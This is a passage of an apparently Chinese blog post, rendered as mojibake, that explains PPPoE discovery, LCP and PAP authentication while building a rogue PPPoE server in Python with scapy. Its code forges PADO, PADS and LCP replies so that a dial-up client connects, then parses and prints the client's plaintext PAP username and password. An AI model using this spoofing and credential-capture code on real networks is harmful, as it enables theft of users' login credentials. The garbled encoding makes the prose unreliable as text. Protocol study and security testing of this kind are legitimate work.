æˆ– PPPoEå¸§æ ¼å¼\nè¿™é‡Œçš„ 0x0103 å³ä»£è¡¨ Host-Uniqï¼Œæ˜¯ä¸»æœºå”¯ä¸€æ ‡è¯†ï¼Œä½œç”¨åœ¨ä¸Šæ–‡å·²ç»æåŠã€‚\né‚£æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªè¦æ±‚å†™ä¸€ä¸ªå‘é€ PADO åŒ…çš„å‡½æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 #å‘é€PADOå›æ‰§åŒ… def send_pado_packet(self, pkt): # å¯»æ‰¾å®¢æˆ·ç«¯çš„Host_Uniq _host_Uniq = self.padi_find_hostuniq(pkt.payload) _payload = b\u0026#39;\\x01\\x02\\x00\\x07akkuman\\x01\\x01\\x00\\x00\u0026#39; if _host_Uniq: _payload += _host_Uniq # PADO å›æ‰§åŒ…çš„ sessoinid ä¸º 0x0000 pkt.sessionid = getattr(pkt, \u0026#39;sessionid\u0026#39;, 0x0000) sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=0x8863) / PPPoED(version=1, type=1, code=0x07, sessionid=pkt.sessionid, len=len(_payload)) / _payload scapy.sendp(sendpkt) å…¶ä¸­çš„ pkt æ˜¯æ¥æ”¶åˆ°çš„ PADI æ•°æ®åŒ…ã€‚\nä¸Šé¢çš„ _payload ä¸­çš„ \\x01\\x02 ä»£è¡¨æ˜¯ AC-Name å­—æ®µï¼Œ\\x00\\x07 æ˜¯åé¢çš„ akkuman çš„é•¿åº¦ã€‚\\x01\\x01 æ˜¯ä»£è¡¨ Service-Name å­—æ®µï¼Œä¸€èˆ¬ä¸ºç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œç›´æ¥å¡« \\x00\\x00ã€‚ä¸‹æ–‡ä¸å†èµ˜è¿°ã€‚\nå…¶ä¸­çš„æº mac åœ°å€å’Œç›®æ ‡ mac åœ°å€æˆ‘ä»¬éœ€è¦æ”¹æ”¹ã€‚\nç„¶ååŠ ä¸Š Host-Uniq å­—æ®µï¼Œå°è£…æˆåŒ…å‘å‡ºå»ï¼Œæ³¨æ„è¿™é‡Œçš„ type=0x8863 æ˜¯ä»£è¡¨å‘ç°é˜¶æ®µï¼Œ0x8864 æ˜¯ä¼šè¯é˜¶æ®µã€‚\nè‡³äºè¿™ä¸ªæ˜¯æ€ä¹ˆå°è£…èµ·æ¥çš„ï¼Œè¿™ä¸ªæ˜¯ scapy åº“çš„è¯­æ³•ï¼ŒEther ä»£è¡¨é“¾è·¯å±‚ï¼Œå‰©ä¸‹çš„ä¾æ­¤å¤§å®¶å‚ç…§å›¾å³å¯ç†è§£ï¼Œæœ€åçš„ _payload ä»£è¡¨æ¥ä¸Šä¸€æ®µåŸå§‹æ•°æ®ï¼Œä¸€èˆ¬å°±æ˜¯ bytesã€‚\nPADR å› ä¸º PADI åŒ…æ˜¯å¹¿æ’­çš„ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯æœ‰å¯èƒ½æ”¶åˆ°ä¸åŒçš„æ¥å…¥é›†ä¸­å™¨å¤šä¸ªçš„ PADO å“åº”åŒ…ï¼Œå®¢æˆ·ç«¯åº”è¯¥åŸºäº AC-Name å’Œå¯ä»¥æä¾›çš„æœåŠ¡ï¼ˆè¿™ä¸ªå‚è§ RFC2516ï¼‰ä»ä¸­é€‰æ‹©ä¸€ä¸ªåˆé€‚çš„æ¥å…¥é›†ä¸­å™¨ã€‚\nç„¶åå®¢æˆ·ç«¯å°±å‘é€ PADR åŒ…åˆ°è‡ªå·±é€‰æ‹©çš„æ¥å…¥é›†ä¸­å™¨ï¼ˆå°†ç›®æ ‡ mac æ”¹æˆ PADO åŒ…ä¸­çš„æº mac å³å¯ï¼‰ï¼Œå…¶ä¸­ CODE å­—æ®µä¸º 0Ã—19ï¼ŒSESSION_ID å­—æ®µå€¼ä»ä¸º 0Ã—0000ã€‚\nPADS å½“æ¥å…¥é›†ä¸­å™¨æ”¶åˆ°ä¸€ä¸ª PADR åŒ…ä»¥åï¼Œå°±è¦å‡†å¤‡å¼€å§‹ä¸€ä¸ª PPP ä¼šè¯äº†ã€‚\nåœ¨è¿™ä¸ªé˜¶æ®µï¼Œæ¥å…¥é›†ä¸­å™¨ä¼šä¸ºæ¥ä¸‹æ¥çš„ PPPoE ä¼šè¯ç”Ÿæˆä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ SESSION_IDï¼Œç„¶åç»„è£…èµ·æ¥è¿›è¡Œå‘é€ã€‚å…¶ä¸­ CODE å­—æ®µå€¼ä¸º 0Ã—65 ã€‚\næ ¹æ®æ­¤æˆ‘ä»¬å¯ä»¥å†™å‡ºä¸€ä¸ªå‘é€ PADS åŒ…çš„å‡½æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 #å‘é€PADSå›æ‰§åŒ… def send_pads_packet(self, pkt): #å¯»æ‰¾å®¢æˆ·ç«¯çš„Host_Uniq _host_Uniq = self.padi_find_hostuniq(pkt.payload) _payload = b\u0026#39;\\x01\\x01\\x00\\x00\u0026#39; if _host_Uniq: _payload += _host_Uniq pkt.sessionid = SESSION_ID sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=0x8863) / PPPoED(version=1, type=1, code=0x65, sessionid=pkt.sessionid, len=len(_payload)) / _payload scapy.sendp(sendpkt) å…¶ä¸­çš„ pkt ä¸ºæ¥æ”¶åˆ°çš„ PADR æ•°æ®åŒ…ã€‚\næ­¤æ—¶å‘ç°é˜¶æ®µå°±å·²ç»å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œ PPPoE çš„ä¼šè¯é˜¶æ®µäº†ã€‚\nPPPoE ä¼šè¯é˜¶æ®µ PPPoE ä¼šè¯é˜¶æ®µçš„æŠ“åŒ…å¹¶æ²¡æœ‰é‚£ä¹ˆæ˜æ˜¾çš„ç‰¹å¾ï¼Œå¯èƒ½ä½ åœ¨ä¸åŒçš„æ—¶é—´çœ‹åˆ°çš„åŒ…çš„é¡ºåºéƒ½ä¸å¤ªä¸€æ ·ã€‚\nåœ¨æ­¤é˜¶æ®µçš„ Type ä¸º 0x8864ï¼Œä»£è¡¨ PPPoESï¼Œå³ä¼šè¯é˜¶æ®µã€‚\nLCPé“¾è·¯é…ç½®å»ºç«‹ ä¸€ä¸ªå…¸å‹çš„ LCP Request å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\nProtocolï¼šå†³å®šäº†åé¢çš„è½½è·åŒ…å«çš„æ˜¯ä»€ä¹ˆæ ·çš„åè®®æŠ¥æ–‡ï¼Œç±»ä¼¼ä»¥å¤ªå¸§çš„ç±»å‹å­—æ®µï¼Œæ˜¯ç”¨ä»¥åŒºåˆ†è½½è·é€ç»™å“ªä¸ªä¸Šå±‚åè®®å¤„ç†ã€‚æ”¶ä¸‹ä¸ºå¸¸è§åè®®å·ï¼š\n0xC021: LCPæŠ¥æ–‡ 0xC023: Password Authentication Protocol ï¼ˆPAPï¼‰ 0xC223: Challenge Handshake Authentication Protocol ï¼ˆCHAPï¼‰ 0x8021: IPCPæŠ¥æ–‡ï¼Œå®ƒæ˜¯NCPåè®®çš„ä¸€ç§ ï¼ˆç”¨æ¥åå•†åˆ†é… ipï¼‰ 0x0021: IPæŠ¥æ–‡ LCP(Link Control Protocol) æ˜¯é“¾è·¯æ§åˆ¶åè®®ï¼Œæ˜¯ PPP åè®®çš„ä¸€ä¸ªæˆå‘˜åè®®ï¼ŒPPP åè®®åœ¨ LCP é˜¶æ®µé»˜è®¤ä¸åšè®¤è¯åå•†ï¼ŒLCP çš„è®¤è¯åªä½œä¸ºä¸€ä¸ªå¯é€‰çš„å‚æ•°ã€‚\næ¥å…¥é›†ä¸­å™¨å’Œå®¢æˆ·ç«¯åŒæ–¹é€šè¿‡äº¤äº’LCPé…ç½®æŠ¥æ–‡æ¥åå•†æ•°æ®é“¾è·¯ã€‚\nåå•†å†…å®¹åŒ…æ‹¬éªŒè¯æ–¹å¼ã€æœ€å¤§æ¥æ”¶å•å…ƒ MRUã€é­”æœ¯å­—ï¼ˆMagic Numberï¼‰ç­‰é€‰é¡¹ã€‚ åœ¨æ­¤é˜¶æ®µ LCP çš„çŠ¶æ€æœºå‘ç”Ÿä¸¤æ¬¡æ”¹å˜ï¼Œè¿›å…¥ä¼šè¯é˜¶æ®µåï¼Œæ£€æµ‹åˆ°é“¾è·¯å¯ç”¨ï¼Œåˆ™ç‰©ç†å±‚ä¼šå‘é“¾è·¯å±‚å‘é€ä¸€ä¸ª UP äº‹ä»¶ï¼Œé“¾è·¯å±‚æ”¶åˆ°è¯¥äº‹ä»¶åï¼Œä¼šå°†LCPçš„çŠ¶æ€æœºä»å½“å‰çŠ¶æ€æ”¹å˜ä¸º Request-Sentï¼ˆè¯·æ±‚å‘é€ï¼‰çŠ¶æ€ã€‚ LCP å¼€å§‹å‘é€ Config-Request æŠ¥æ–‡ï¼ˆå³ä¸Šå›¾ä¸­ LCP ä¸‹é¢çš„ CODE å­—æ®µï¼Œä¸º 1 ä»£è¡¨ Config-Requestï¼‰æ¥åå•†æ•°æ®é“¾è·¯ï¼Œæ— è®ºå“ªä¸€ç«¯æ¥æ”¶åˆ°äº† Config-Ack æŠ¥æ–‡ï¼ˆLCP çš„ CODE å­—æ®µä¸º 2ï¼‰æ—¶ï¼Œ LCPçš„çŠ¶æ€æœºåˆè¦å‘ç”Ÿæ”¹å˜ï¼Œä»å½“å‰çŠ¶æ€æ”¹å˜ä¸º Opened çŠ¶æ€ï¼Œè¿›å…¥ Opened çŠ¶æ€åæ”¶åˆ° Config-Ack æŠ¥æ–‡çš„ä¸€æ–¹åˆ™å®Œæˆäº†å½“å‰é˜¶æ®µï¼Œåº”è¯¥å‘ä¸‹ä¸€ä¸ªé˜¶æ®µè·ƒè¿ï¼Œä¸‹ä¸€ä¸ªé˜¶æ®µå¯èƒ½æ˜¯ Authenticationï¼ˆå¦‚ PAP æˆ– CHAPï¼‰ï¼Œä¹Ÿå¯èƒ½æ˜¯ Network Layer Protocolï¼ˆNLPï¼‰ã€‚ åŒç†å¯çŸ¥ï¼Œå¦ä¸€ç«¯ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä½†é¡»æ³¨æ„çš„ä¸€ç‚¹æ˜¯åœ¨é“¾è·¯é…ç½®é˜¶æ®µåŒæ–¹æ˜¯é“¾è·¯é…ç½®æ“ä½œè¿‡ç¨‹æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚\nå¦‚æœé…ç½®äº†éªŒè¯ï¼Œå°†è¿›å…¥Authenticationé˜¶æ®µï¼ŒCHAP æˆ– PAP éªŒè¯ã€‚å¦‚æœæ²¡æœ‰é…ç½®éªŒè¯ï¼Œåˆ™ç›´æ¥è¿›å…¥ Network Layer Protocol é˜¶æ®µï¼Œå³å¼€å§‹åˆ†é… ip ç­‰æ“ä½œã€‚\nè¿™æ˜¯åœ¨ç½‘ä¸Šæ‰¾çš„ LCP æŠ¥æ–‡æ ¼å¼ï¼Œå…¶å®æ›´å»ºè®®å¤§å®¶é…åˆ wireshark æŠ“åŒ…æ¥çœ‹ã€‚\nä¸Šé¢æˆ‘çš„æåˆ°äº† LCP ä¸­çš„ codeï¼ŒLCPåè®®ä½¿ç”¨Codeå­—æ®µåŒºåˆ†11ç§æŠ¥æ–‡æ ¼å¼ï¼Œè¯¦ç»†çš„è¡¨è§ä¸‹ï¼Œå¹³æ—¶æˆ‘ä»¬ç”¨çš„æ¯”è¾ƒå¤šçš„å°±æ˜¯ 1 å’Œ 2\nIdentifierï¼šæ ‡è¯†åŸŸçš„å€¼è¡¨ç¤ºè¿›è¡Œåå•†æŠ¥æ–‡çš„åŒ¹é…å…³ç³»ã€‚ æ ‡è¯†åŸŸç›®çš„æ˜¯ç”¨æ¥åŒ¹é…è¯·æ±‚å’Œå“åº”æŠ¥æ–‡ã€‚å½“å¯¹ç«¯æ¥æ”¶åˆ°è¯¥é…ç½®è¯·æ±‚æŠ¥æ–‡åï¼Œæ— è®ºä½¿ç”¨ä½•ç§æŠ¥æ–‡å›åº”å¯¹æ–¹ï¼Œä½†å¿…é¡»è¦æ±‚å›åº”æŠ¥æ–‡ä¸­çš„IDè¦ä¸æ¥æ”¶æŠ¥æ–‡ä¸­çš„IDä¸€è‡´ã€‚æ¢å¥è¯è¯´ï¼Œåœ¨ä¸€ä¸ªåå•†æ•°æ®é“¾è·¯é˜¶æ®µï¼Œè¿™ä¸ªå­—æ®µçš„å€¼éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåœ¨æœ¬æ¬¡æˆ‘çš„ä¾‹å­æŠ“åŒ…ä¸­ä¸º 1ã€‚\nLengthï¼šå®ƒæ˜¯ä»£ç åŸŸCodeã€æ ‡å¿—åŸŸIdentifiedã€é•¿åº¦åŸŸLengthå’Œæ•°æ®åŸŸDataå››ä¸ªåŸŸé•¿åº¦çš„æ€»å’Œã€‚\nä¸‹é¢æ˜¯ä¸€å¼ å›¾ï¼Œç”¨æ¥è¯´æ˜ req ä¸ ack çš„äº¤äº’ã€‚\nä»è¿™å¼ å›¾ä¸­å¯ä»¥ç›¸ä¿¡ä¸éš¾ç†è§£ä¹‹å‰çš„è¯äº†ï¼ŒA å’Œ B åˆå§‹éƒ½åœ¨ Request-Sentï¼ˆè¯·æ±‚å‘é€ï¼‰çŠ¶æ€ã€‚ ç„¶åä¸¤è€…éƒ½å¼€å§‹å‘é€ Config-Request æŠ¥æ–‡ï¼Œåªæœ‰ A å’Œ B éƒ½æ”¶åˆ°äº†å¯¹æ–¹çš„ Config-Ack æŠ¥æ–‡ã€‚ æ‰æ ‡å¿—ç€ LCP çŠ¶æ€å˜è¿çš„å®Œæˆï¼Œå¯ä»¥å‘ä¸‹ä¸€ä¸ªé˜¶æ®µ NLP æˆ–è€… Autionticationï¼ˆPAP æˆ– CHAPï¼‰è·ƒè¿ã€‚\nåœ¨åå•†æ•°æ®é“¾è·¯é…ç½®é˜¶æ®µï¼Œç‚¹å¯¹ç‚¹ï¼ˆPPPoEæ˜¯ç‚¹å¯¹ç‚¹åè®®ï¼‰åŒæ–¹è‡³å°‘éƒ½å‘äº†ä¸€ä¸ª Config-Request æŠ¥æ–‡ï¼Œè¯¥æŠ¥æ–‡ä¸­åŒ…å«äº†å‘é€æ–¹å¯¹äºæ‰€æœ‰çš„é…ç½®å‚æ•°çš„æœŸæœ›å€¼ã€‚\nå…³äºåœ¨åå•†æ•°æ®é“¾è·¯é…ç½®é˜¶æ®µå¯èƒ½å‡ºç°çš„æŠ¥æ–‡ï¼Œæˆ‘ç»™å¤§å®¶æ‰¾äº†ä¸€é¡µ PPT\nå¦‚æœå¯¹æ–¹å¯¹äºè‡ªå·±å‘é€çš„ Config-Request å›åº”äº†ä¸€ä¸ª Config-Ackï¼Œåˆ™è¯´æ˜å¯¹æ–¹èƒ½è¯†åˆ«æ‰€æœ‰é€‰é¡¹ï¼Œå¹¶ä¸”å…¨éƒ¨èƒ½å¤Ÿè¢«æ¥å—ï¼› å¦‚æœå¯¹æ–¹å¯¹äºè‡ªå·±å‘é€çš„ Config-Request å›åº”äº†ä¸€ä¸ª Config-Nakï¼Œåˆ™è¯´æ˜å¯¹æ–¹èƒ½è¯†åˆ«æ‰€æœ‰é€‰é¡¹ï¼Œä½†åªæœ‰éƒ¨åˆ†èƒ½å¤Ÿè¢«æ¥å—ï¼› å¦‚æœå¯¹æ–¹å¯¹äºè‡ªå·±å‘é€çš„ Config-Request å›åº”äº†ä¸€ä¸ª Config-Rejï¼Œåˆ™è¯´æ˜å¯¹æ–¹æœ‰éƒ¨åˆ†é€‰é¡¹ä¸èƒ½è¢«è¯†åˆ«ï¼Œæˆ–è€…ä¸èƒ½è¢«æ¥å—ï¼› å¦‚æœåŒæ–¹æœ€ç»ˆæ”¶åˆ°å¯¹æ–¹å‘é€çš„ Config-Ack æŠ¥æ–‡ï¼Œåˆ™è¯´æ˜å¯¹æ–¹å¯¹äºè‡ªå·±æå‡ºçš„é…ç½®å‚æ•°çš„åå•†å·²ç»å–å¾—äº†ä¸€è‡´ï¼Œè¿™åŒæ—¶ä¹Ÿæ ‡å¿—ç€é“¾è·¯å»ºç«‹é¡ºåˆ©ç»“æŸã€‚ å¦‚æœæ¥æ”¶åˆ°äº† Config-Nak æˆ–è€… Config-Rejï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€è‡ªå·±å¿…é¡»ä¿®æ”¹ç›¸åº”é…ç½®å‚æ•°çš„æœŸæœ›å€¼ï¼Œç„¶åå‘å¯¹æ–¹é‡æ–°å‘é€ä¸€ä¸ªConfig-RequestæŠ¥æ–‡ï¼Œä¸”ç­‰å¾…å¯¹æ–¹æ–°çš„å›åº”ã€‚\nä½†æ˜¯å°±æˆ‘æŠ“åˆ°çš„è¿‡ç¨‹ä¸­ï¼Œæ²¡çœ‹è§è¿‡åœ¨è¿™ä¸ªé˜¶æ®µæœ‰ Config-Nak çš„å‡ºç°ã€‚\næœ‰äº†ä¸Šé¢çš„åŸºç¡€ï¼Œæˆ‘ä»¬å†æ¥çœ‹æˆ‘çš„æŠ“åŒ…å†å²è®°å½•\nå…¶å®å¤§å¤šä¸ç”¨ç®¡ï¼Œåªéœ€è¦çŸ¥é“æ”¶åˆ°ä¸€ä¸ª Config-Request å¾—å›ä¸€ä¸ª Config-Ackï¼Œå¹¶ä¸”è‡ªå·±ä¹Ÿå¾—å‘ä¸€ä¸ª Config-Requestï¼Œå¹¶ç­‰å¾…æ¥æ”¶åˆ°å¯¹æ–¹çš„ Config-Ackã€‚\nä½†æ˜¯æˆ‘æŠ“äº†å¥½å‡ æ¬¡åŒ…ï¼Œæµ‹è¯•äº†ä¸å°‘æ¬¡ï¼Œå‘ç°ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€æ–¹åœ¨ç¬¬ä¸€æ¬¡æ¥æ”¶åˆ°å¯¹æ–¹çš„ Config-Request æŠ¥æ–‡æ—¶ä¼šå›åº”ä¸€ä¸ª Config-Rejã€‚åç»­æ‰å¼€å§‹å¯¹æ¥æ”¶åˆ°çš„ Config-Request å›åº” Config-Ackã€‚\næ®æ­¤æˆ‘ä»¬å¯ä»¥å†™å‡ºä»£ç ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #å¤„ç† PPP LCP è¯·æ±‚ def send_lcp(self, pkt): # åˆå§‹åŒ– clientMap if not self.clientMap.get(pkt.src): self.clientMap[pkt.src] = {\u0026#34;req\u0026#34;: 0, \u0026#34;ack\u0026#34;: 0} # å¤„ç† LCP-Configuration-Req è¯·æ±‚ if bytes(pkt.payload)[8] == 0x01: # ç¬¬ä¸€æ¬¡ LCP-Configuration-Req è¯·æ±‚è¿”å› Rej å“åº”åŒ… if self.clientMap[pkt.src][\u0026#39;req\u0026#39;] == 0: self.clientMap[pkt.src][\u0026#39;req\u0026#39;] += 1 print(\u0026#34;ç¬¬ %d æ¬¡æ”¶åˆ°LCP-Config-Req\u0026#34; % self.clientMap[pkt.src][\u0026#34;req\u0026#34;]) print(\u0026#34;å¤„ç†Reqè¯·æ±‚ï¼Œå‘é€LCP-Config-RejåŒ…\u0026#34;) self.send_lcp_reject_packet(pkt) print(\u0026#34;å‘é€LCP-Config-ReqåŒ…\u0026#34;) self.send_lcp_req_packet(pkt) # åé¢çš„ LCP-Configuration-Req è¯·æ±‚å‡è¿”å› Ack å“åº”åŒ… else: self.clientMap[pkt.src][\u0026#39;req\u0026#39;] += 1 print(\u0026#34;ç¬¬ %d æ¬¡æ”¶åˆ°LCP-Config-Req\u0026#34; % self.clientMap[pkt.src][\u0026#34;req\u0026#34;]) print(\u0026#34;å¤„ç†Reqè¯·æ±‚ï¼Œå‘é€LCP-Config-AckåŒ…\u0026#34;) self.send_lcp_ack_packet(pkt) # å¤„ç† LCP-Configuration-Rej è¯·æ±‚ elif bytes(pkt.payload)[8] == 0x04: print(\u0026#34;å¤„ç†Rejè¯·æ±‚ï¼Œå‘é€LCP-Config-ReqåŒ…\u0026#34;) self.send_lcp_req_packet(pkt) # å¤„ç† LCP-Configuration-Ack è¯·æ±‚ elif bytes(pkt.payload)[8] == 0x02: self.clientMap[pkt.src][\u0026#39;ack\u0026#39;] += 1 print(\u0026#34;ç¬¬ %d æ”¶åˆ°LCP-Config-Ack\u0026#34; % self.clientMap[pkt.src][\u0026#34;ack\u0026#34;]) else: pass clientMap è¯·æ— è§†ï¼Œæœ€å¼€å§‹æ˜¯æ‰“ç®—æ”¯æŒå¤šä¸ª clientï¼Œå¹¶åšè®°å½•ä½¿ç”¨ï¼Œä½†æ˜¯å‘ç°æ‹¦æˆªæ ¹æœ¬ä¸ç”¨å®ç°è¿™ä¸ªã€‚\nå…¶ä¸­çš„æ–¹æ³•æˆ‘ä»¬å…ˆä¸å±•å¼€ï¼Œåˆ°æ—¶å€™ä¼šç»™å¤§å®¶æŠŠæ‰€æœ‰ä»£ç æ”¾ä¸Šæ¥ï¼Œæ ¹æ®æ–¹æ³•åå¤§å®¶åº”è¯¥èƒ½çŒœåˆ°æ˜¯ç”¨æ¥å¹²å˜›çš„ã€‚\nAuthentication é˜¶æ®µ é“¾è·¯å»ºç«‹èµ·æ¥åï¼Œåº”è¯¥å‘ä¸‹ä¸€ä¸ªé˜¶æ®µè·ƒè¿ï¼Œä¸‹ä¸€ä¸ªé˜¶æ®µä¸€èˆ¬æ˜¯ Authenticationã€‚ä¸€èˆ¬æ¥è¯´å°±åªæœ‰ PAP å’Œ CHAPã€‚\nCHAP åœ¨é«˜æ ¡æ‹¨å·å®¢æˆ·ç«¯ä¸­ä½¿ç”¨è¿˜å¹¶ä¸ç®—å¤šï¼Œå¤§å¤šé‡‡ç”¨ PAPï¼Œæ‰€ä»¥ CHAP æˆ‘ä»¬æš‚ä¸”æŒ‰ä¸‹ä¸è¡¨ï¼Œç›¸ä¿¡è¦æ˜¯ä½ èƒ½çœ‹å®Œè¿™ç¯‡æ–‡ç« å¹¶è‡ªå·±åŠ¨æ‰‹å®è·µçš„è¯ï¼ŒCHAP çš„åˆ†æå¯¹ä½ æ¥è¯´ä¹Ÿæ˜¯æ‰‹åˆ°æ“’æ¥ã€‚\nåœ¨è¿™é‡Œæˆ‘ä»¬ä¸»è¦ä»‹ç» PAP è®¤è¯ä»¥åŠæœ€æœ€å…³é”®çš„ç¯èŠ‚ï¼šæŠ“å–è´¦å·å¯†ç ã€‚\nPAP çš„ Protocol å­—æ®µä¸º 0xc023\nPAP åŒ…æ ¼å¼è§ä¸‹å›¾\nä»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ° CODE å­—æ®µä¸º 1ï¼Œä»£è¡¨ä¸€ä¸ª Authentication-Requestã€‚å‰é¢æˆ‘ä»¬è¯´è¿‡äº†ï¼ŒIdentifier å­—æ®µåœ¨é“¾è·¯å»ºç«‹é˜¶æ®µï¼Œè¿™ä¸ªå­—æ®µçš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œç„¶åè·ƒè¿åˆ°ä¸‹ä¸€é˜¶æ®µåï¼Œè¿™ä¸ªå­—æ®µçš„å€¼éšç€æ¯ä¸ªè¯·æ±‚é€’å¢ã€‚\nPAP åŒ…çš„è®¤è¯æ–¹å¼æ˜¯ç”±è¢«è®¤è¯ç«¯ä¸»åŠ¨å‘èµ·ï¼Œè¢«è®¤è¯ç«¯å‘é€æ˜æ–‡å£ä»¤è‡³è®¤è¯ç«¯ï¼Œç”±å¯¹æ–¹è®¤è¯ã€‚\nPAP å¹¶ä¸èƒ½é˜²æ­¢é‡æ”¾å’Œç©·ä¸¾ç­‰æ”»å‡»ï¼Œè€Œ CHAP æ˜¯ç”±è®¤è¯ç«¯ä¸»åŠ¨å‘èµ·ï¼ˆchallenge æŒ‘æˆ˜ï¼‰ï¼Œå…·ä½“çš„å®‰å…¨æå‡å¤§å®¶å¯ä»¥è‡ªè¡ŒæŸ¥é˜…ç›¸å…³èµ„æ–™ã€‚\nå…¶ä¸­çš„ CODE å­—æ®µæˆ‘ä»¬å¯ä»¥å‚è§ä¸‹è¡¨\nCODE å€¼ æŠ¥æ–‡åç§° 1 Authentication-Request 2 Authentication-Ack 3 Authentication-Nak æˆ‘ä»¬æ‰€åšçš„æ˜¯æ‹¦æˆªï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å…³å¿ƒ Authentication-Request çš„ Data å­—æ®µå°±å¥½ï¼ŒData å­—æ®µä¸­ï¼ŒPeer-IDï¼ˆç”¨æˆ·åï¼‰å­—æ®µï¼ŒPasswordå­—æ®µï¼Œå®ƒä»¬éƒ½æ˜¯æ˜æ–‡çš„ã€‚\nè¿™é‡Œå¤šè¯´ä¸€ç‚¹å…³äº Authentication-Ack å’Œ Authentication-Nakï¼Œå¦‚æœè®¤è¯æˆåŠŸï¼Œè®¤è¯ç«¯ä¼šè¿”å›ä¸€ä¸ª Ack å¹¶æºå¸¦æˆåŠŸä¿¡æ¯ç»™è¢«è®¤è¯ç«¯ï¼Œç›¸åï¼Œè®¤è¯å¤±è´¥ä¼šè¿”å› Nak å¹¶æºå¸¦ç›¸å…³ä¿¡æ¯ã€‚\næ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯åœ¨æ”¶åˆ° Authentication-Request åŒ…æ—¶è§£æå‡ºè´¦å·å¯†ç å³å¯å®Œæˆæˆ‘ä»¬çš„å° demo äº†ã€‚\nä»£ç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # è§£æpapè´¦å·å¯†ç  def get_papinfo(self, pkt): # pap-req _payLoad = bytes(pkt.payload) if _payLoad[8] == 0x01: _nUserLen = int(_payLoad[12]) _nPassLen = int(_payLoad[13 + _nUserLen]) _userName = _payLoad[13:13 + _nUserLen] _passWord = _payLoad[14 + _nUserLen:14 + _nUserLen + _nPassLen] print(\u0026#34;get User:%s,Pass:%s\u0026#34; % (str(_userName), str(_passWord))) #self.send_pap_authreject(pkt) if pkt.src in self.clientMap: del self.clientMap[pkt.src] print(\u0026#34;æ¬ºéª—å®Œæ¯•....\u0026#34;) 0x01 å³ä»£è¡¨ CODE å­—æ®µçš„ Authentication-Requestã€‚æˆ‘ä»¬åªéœ€è¦ä»è¿™ä¸ªåŒ…é‡Œé¢æŒ‰ç…§æŠ“åŒ…ä¸­çš„æ ¼å¼è¿›è¡Œè§£æå³å¯è·å–è´¦å·å¯†ç ã€‚\næ€»ä½“å®Œæˆä»£ç æˆ‘ä¼šæ”¾åœ¨æ–‡ç« æœ€å\né‡åˆ°çš„ä¸€äº›å‘ å°±ç®—æ˜¯ä¸€ä¸ªå¹¶ä¸ç®—å¾ˆå›°éš¾çš„ä¸œè¥¿ï¼Œä½†æ˜¯åœ¨åšè¿™ä¸ªä¸œè¥¿çš„è¿‡ç¨‹ä¸­è¿˜æ˜¯é‡åˆ°äº†ä¸å°‘å‘ï¼Œæˆ‘åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œå…å¾—åäººå’Œæˆ‘ä¸€æ ·è¸©å‘ã€‚\næœ€å¼€å§‹æˆ‘æƒ³ç€å› ä¸ºéƒ½æ˜¯æœ¬æœºæ­å»º client å’Œ serverï¼Œé‚£ä¹ˆæˆ‘ç›´æ¥æŠŠé“¾è·¯å±‚çš„ source å’Œ destination çš„ mac éƒ½è®¾ç½®ä¸ºæœ¬æœºçš„ç‰©ç†ç½‘å¡ macï¼Œä¹Ÿå°±æ˜¯å…¨éƒ¨é‡‡ç”¨ç¬¬ä¸€ä¸ª PADI åŒ…ä¸­çš„ source macï¼Œä½†æ˜¯æˆ‘å‘ç° é™¤äº†æœ€å¼€å§‹çš„ PADI å’Œ PADOï¼Œåé¢çš„åŒ…ï¼Œç”¨ wireshark æ ¹æœ¬æŠ“ä¸åˆ°ï¼Œæˆ‘çŒœæƒ³æ˜¯ä¸æ˜¯ä¸¤ä¸ª mac ç›¸åŒçš„åŸå› ï¼Œå¯¼è‡´åŒ…è¢«ä¸¢å¼ƒäº† client æ²¡æ”¶åˆ°ï¼Œæˆ–è€… client æœ¬èº«æ¥åˆ°è¿™ä¸ªåŒ…ï¼Œä½†æ˜¯å‘ç°ä¸¤ä¸ª mac ç›¸åŒã€‚ äºæ˜¯ä¸ç»§ç»­å‘é€ PADR äº†ï¼Œè¿™ä¸ªåŸå› æˆ‘å¹¶ä¸æ˜ç™½ï¼Œå¯ä»¥å®Œæ•´æ•è·æµç¨‹çš„åªèƒ½æ˜¯ server æ­å»ºåœ¨è™šæ‹Ÿæœºæˆ–è€…ç½‘å…³ä¹Ÿå°±æ˜¯è·¯ç”±å™¨ã€‚è¿™ä¸ªç»“æœè®©æˆ‘ååˆ†æ²®ä¸§ã€‚ç„¶åæˆ‘é‡‡ç”¨äº†å‡ ç§æˆ‘èƒ½æƒ³åˆ°çš„åŠæ³•ï¼Œä½†æ˜¯å‡ä¸å¥æ•ˆã€‚\næœ€å®¹æ˜“æƒ³åˆ°çš„åº”è¯¥æ˜¯ä¼ªé€  server mac äº†ã€‚ä½†å¹¶ä¸èƒ½æŠ“åˆ°ï¼Œæˆ‘æ€€ç–‘æ˜¯æ²¡åŠæ³•æ‰¾åˆ°è¿™ä¸ª macï¼Œå¯èƒ½ä¸¢å¼ƒäº†ï¼Œä½†æ˜¯æˆ‘ä¸ç†è§£ä¸ºä»€ä¹ˆå°±ç®—æ‰¾ä¸åˆ°åº”è¯¥ä¹Ÿä¼šå‘ä¸ªåŒ…å§ï¼Œä¸è‡³äºæŠ“åŒ…è®°å½•éƒ½æ²¡æœ‰ã€‚ 